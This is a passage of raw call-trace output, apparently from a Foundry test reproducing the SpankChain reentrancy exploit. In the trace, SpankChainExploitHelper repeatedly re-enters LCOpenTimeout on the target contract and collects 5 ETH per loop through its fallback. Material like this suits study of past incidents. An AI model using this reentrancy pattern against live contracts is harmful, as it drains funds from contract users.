    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [215429] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [214038] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [199105] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [197714] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [182781] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [181390] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [166457] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [165066] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [150133] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [148742] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [133809] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [132418] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [117485] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [116094] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [101161] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [99770] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [84837] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [83446] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [68513] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [67122] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [52189] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [50798] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [40] SpankChainExploitHelper::fallback{value: 5000000000000000000}()
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [35865] SpankChainExploitHelper::transfer(SpankChainExploitHelper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [34474] 0xf91546835f756DA0c10cFa0CDA95b15577b84aA7::LCOpenTimeout(0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45)
